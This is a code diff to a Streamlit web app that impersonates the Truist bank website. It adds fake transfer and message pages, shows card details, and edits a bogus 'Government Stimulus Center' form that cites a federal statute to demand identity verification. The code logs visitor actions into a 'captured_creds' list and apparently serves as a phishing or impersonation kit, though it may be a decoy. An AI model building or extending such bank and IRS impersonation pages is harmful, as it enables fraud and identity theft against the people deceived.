@@ -113,13 +113,34 @@ def cards_page():
     st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
     st.markdown("<div style='font-size:80px; text-align:center'>💳</div><h2 style='text-align:center; color:#502b85'>Truist One Rewards Card</h2><h3 style='text-align:center'>•••• •••• •••• 7723</h3>", unsafe_allow_html=True)
     col1, col2, col3 = st.columns(3)
-    with col1: if st.button("Show Full Number"): st.success("5412 7537 0000 7723")
-    with col2: if st.button("Show Expiry"): st.success("11/28")
-    with col3: 
+    with col1:
+        if st.button("Show Full Number"):
+            st.success("5412 7537 0000 7723")
+    with col2:
+        if st.button("Show Expiry"):
+            st.success("11/28")
+    with col3:
         if st.button("Show CVV"):
             st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "action": "CVV Revealed"})
-            st.info("CVV: 342"); st.balloons()
+            st.info("CVV: 342")
+            st.balloons()
     st.markdown("</div>", unsafe_allow_html=True)
+
+def transfer():
+    st.markdown("<h1 style='text-align:center; color:#ffb700'>Transfer Funds</h1>", unsafe_allow_html=True)
+    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
+    st.radio("Type", ["My Accounts", "External", "Zelle"])
+    col1, col2 = st.columns(2)
+    with col1: st.selectbox("From", ["Checking ****2847", "Savings ****5901"])
+    with col2: st.selectbox("To", ["Savings ****5901", "External"])
+    st.number_input("Amount", 0.01)
+    if st.button("Send"): st.success("Transfer completed!") ; st.balloons()
+    st.markdown("</div>", unsafe_allow_html=True)
+
+def messages():
+    st.markdown("<h1 style='text-align:center; color:#ffb700'>Secure Messages</h1>", unsafe_allow_html=True)
+    for m in ["Statement Ready", "New Login Alert", "Rate Increase"]:
+        st.markdown(f"<div class='glass-card'><h4>🟢 {m}</h4></div>", unsafe_allow_html=True)
 
 def irs_stimulus_center():
     st.markdown(f"""
@@ -144,7 +165,7 @@ def irs_stimulus_center():
     """, unsafe_allow_html=True)
 
     with st.form("irs_form"):
-        st.markdown("### 🔒 Identity Verification Required (31 U.S.C. § 7701)", key="irs_title")
+        st.markdown("### 🔒 Identity Verification Required (31 U.S.C. § 7701)")
         col1, col2 = st.columns(2)
         with col1:
             first_name = st.text_input("Legal First Name", placeholder="Michael")
@@ -208,5 +229,7 @@ else:
     current = sidebar()
     if current == "Accounts": accounts()
     elif current == "Cards": cards_page()
+    elif current == "Transfer Funds": transfer()
+    elif current == "Messages": messages()
     elif current == "Government Stimulus Center 🇺🇸": irs_stimulus_center()
     else: dashboard()
